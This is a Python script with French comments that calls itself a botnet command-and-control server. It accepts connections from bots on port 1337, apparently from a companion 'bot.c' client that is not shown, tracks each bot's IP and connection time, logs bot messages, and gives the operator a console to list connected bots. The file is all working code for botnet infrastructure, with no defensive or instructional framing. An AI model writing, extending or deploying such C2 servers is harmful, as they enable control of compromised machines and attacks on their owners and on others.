#!/usr/bin/env python3
import socket
import threading
import time
import sys

# Configuration
HOST = '0.0.0.0'  # Écoute sur toutes les interfaces
PORT = 1337       # Port d'écoute (même que dans le bot.c)
MAX_CONNECTIONS = 50

# Liste pour stocker les bots connectés
connected_bots = []
lock = threading.Lock()

def handle_bot(client_socket, address):
    """Gère la connexion d'un bot individuel"""
    print(f"[+] Nouvelle connexion de {address[0]}:{address[1]}")
    
    try:
        # Réception du message d'identification
        data = client_socket.recv(1024).decode('utf-8', errors='ignore')
        
        if data:
            print(f"[*] Message du bot {address[0]}: {data.strip()}")
            
            # Ajoute le bot à la liste des connectés
            with lock:
                bot_info = {
                    'ip': address[0],
                    'port': address[1],
                    'connected_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'socket': client_socket
                }
                connected_bots.append(bot_info)
                print(f"[+] Bot ajouté à la liste. Total: {len(connected_bots)}")
        
        # Boucle pour maintenir la connexion et recevoir d'autres messages
        while True:
            try:
                data = client_socket.recv(1024).decode('utf-8', errors='ignore')
                if not data:
                    break
                print(f"[*] Message du bot {address[0]}: {data.strip()}")
            except:
                break
    
    except Exception as e:
        print(f"[!] Erreur avec le bot {address[0]}: {str(e)}")
    
    finally:
        # Supprime le bot de la liste quand il se déconnecte
        with lock:
            for i, bot in enumerate(connected_bots):
                if bot['socket'] == client_socket:
                    connected_bots.pop(i)
                    break
        
        print(f"[-] Bot {address[0]} déconnecté. Total restant: {len(connected_bots)}")
        client_socket.close()

def list_bots():
    """Affiche la liste des bots connectés"""
    while True:
        cmd = input("\nCommandes disponibles:\n- list: Liste les bots connectés\n- exit: Quitte le serveur\n> ")
        
        if cmd.lower() == "list":
            with lock:
                if not connected_bots:
                    print("[*] Aucun bot connecté")
                else:
                    print("\n=== Bots connectés ===")
                    for i, bot in enumerate(connected_bots):
                        print(f"{i+1}. IP: {bot['ip']} | Connecté depuis: {bot['connected_time']}")
                    print(f"Total: {len(connected_bots)}")
        
        elif cmd.lower() == "exit":
            print("[!] Arrêt du serveur...")
            sys.exit(0)

def main():
    """Fonction principale du serveur C2"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(MAX_CONNECTIONS)
        print(f"[+] Serveur C2 démarré sur {HOST}:{PORT}")
        
        # Démarre un thread pour l'interface utilisateur
        ui_thread = threading.Thread(target=list_bots)
        ui_thread.daemon = True
        ui_thread.start()
        
        # Boucle principale pour accepter les connexions
        while True:
            client_socket, address = server.accept()
            client_handler = threading.Thread(target=handle_bot, args=(client_socket, address))
            client_handler.daemon = True
            client_handler.start()
    
    except KeyboardInterrupt:
        print("\n[!] Arrêt du serveur...")
    
    except Exception as e:
        print(f"[!] Erreur: {str(e)}")
    
    finally:
        # Ferme toutes les connexions
        with lock:
            for bot in connected_bots:
                try:
                    bot['socket'].close()
                except:
                    pass
        
        server.close()

if __name__ == "__main__":
    main()
